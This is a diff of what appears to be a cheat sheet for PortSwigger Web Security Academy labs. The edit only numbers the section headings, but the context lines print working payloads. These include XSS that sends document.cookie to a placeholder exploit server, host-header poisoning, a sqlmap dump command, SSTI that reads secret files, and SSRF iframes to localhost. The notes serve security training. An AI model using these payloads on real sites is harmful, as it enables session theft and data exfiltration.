@@ -108,7 +108,7 @@ For onmessage event:
 </html>
 <iframe src="https://your-exploit-server-id.exploit-server.net/exploit?target=https://your-lab-id.web-security-academy.net/%3Cbody%20onmessage=document.location=%22https://your-exploit-server-id.exploit-server.net/?c=%22%25%32%62(document.cookie)%3E>">
 ```
-# XSS Filter Bypass
+# [1] XSS Filter Bypass
 ## Detect:
 ```
 Search feature parameter such as searchterm, find, etc.
@@ -117,7 +117,7 @@ Search feature parameter such as searchterm, find, etc.
 ```
 
 ```
-# Cache Poisoning
+# [1] Cache Poisoning
 ## Detect:
 ```
 GET / HTTP/1.1
@@ -133,7 +133,7 @@ document.location='https://XX-EXPLOIT-SERVER-URL-XX?x='+document.cookie;
 GET / HTTP/1.1
 X-Forwarded-For: XX-DOMAIN-NAME-EXPLOIT-SERVER-XX
 ```
-# Host Header Poisoning
+# [1] Host Header Poisoning
 ## Detect:
 ```
 Login, there is a "forgot password" form. Try username "administrator" and receive a message such as "An email has been sent to reset the password". If you enter a non-existing username such as "randomname" the message will be different.
@@ -159,7 +159,7 @@ X-Forwarded-Host: LAB-URL.web-security-academy.net:password@XX_EXPLOIT_SERVER.we
 Possible filters to bypass:
 # & ? = @
 ```
-# HTTP Request Smuggling
+# [1] HTTP Request Smuggling
 ## Detect:
 ```
 XSS in the User-Agent found with active scanner when retrieving a comment page.
@@ -194,7 +194,7 @@ GET /post?postId=1 HTTP/1.1
 Host: LAB-SERVER.web-security-academy.net
 User-Agent: "><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://XX_EXPLOIT_SERVER.web-security-academy.net/c-"+document.cookie);x.send();</script>
 ```
-# Bruteforce
+# [1] Bruteforce
 ## Detect:
 ```
 List of usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
@@ -204,7 +204,7 @@ List of passwords: https://portswigger.net/web-security/authentication/auth-lab-
 ```
 Intruder, login usernames / passwords / parameter example user=BRUTEFORCE
 ```
-# CSRF isloggedin
+# [2] CSRF isloggedin
 ## Detect:
 ```
 Set-Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3afalse%7d--MFAOHJNNviuazsqvS%2bywVpIS9UU%2fAhQaFOfa5z8afhuaRHJoj5Q%3d%3d; _lab=.......
@@ -222,7 +222,7 @@ Copy the cookie into the browser to connect as Administrator.
 
 Set Administrator email to own email, then reset password to login.
 ```
-# SQL injection
+# [2] SQL injection
 ## Detect:
 ```
 Advanced search > searchTerm= etc
@@ -234,7 +234,7 @@ Host: ...
 
 sqlmap -r request --level 2 --risk 2 --force-ssl --threads 10 --banner --dbs -D public --tables -T users --dump
 ```
-# Access Control / IDOR
+# [2] Access Control / IDOR
 ## Detect:
 ```
 Logged in, the feature "Change email".
@@ -256,7 +256,7 @@ Connection: close
 Intruder 0 to 1000:
 {"csrf":"XXXXXXXXXXXXXXXXXXXX","email":"wiener@normal-user.net","roleid":§§}
 ```
-# CSRF
+# [2] CSRF
 ## Detect:
 ```
 Change email feature. Remove CSRF parameter.
@@ -281,7 +281,7 @@ Change email feature. Remove CSRF parameter.
 
 Reset administrator password. Change password from email.
 ```
-# CORS
+# [2] CORS
 ## Detect:
 ```
 User panel with UnixTimestamp.
@@ -304,7 +304,7 @@ Use a recent UnixTimestamp 'unixtime': https://currentmillis.com/
 
 In the log response is the administrator's session cookie.
 ```
-# SSTI
+# [3] SSTI
 ## Detect:
 ```
 Admin profile to change the email to exploit email:
@@ -321,7 +321,7 @@ Reset Administrator's password.
 {{settings.SECRET_KEY}}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
 ```
-# Command Injection
+# [3] Command Injection
 ## Detect:
 ```
 Right click images in the blog.
@@ -342,7 +342,7 @@ Feature to download a file. Intercept and Repeater what contains a URL.
 {"table-html":"<div><p>Report Heading</p><iframe src='http://localhost:6566/home/carlos/secret'>"}
 {"PageHtml":"<iframe src='http://localhost:6566/secret'>"}
 ```
-# XXE
+# [3] XXE
 ## Detect:
 ```
 Admin panel with XML upload.
@@ -372,7 +372,7 @@ Send Via Request:
 
 If "DTD disallowed for security purpose" remove &xxe keeping the rest.
 ```
-# Command Injection
+# [3] Command Injection
 ## Detect:
 ```
 Admin panel with XML upload.
@@ -392,7 +392,7 @@ Send request to active scanner.
     </user>
 </users>
 ```
-# SSRF + RFI
+# [3] SSRF + RFI
 ## Detect:
 ```
 Give a link of a new Blog image.
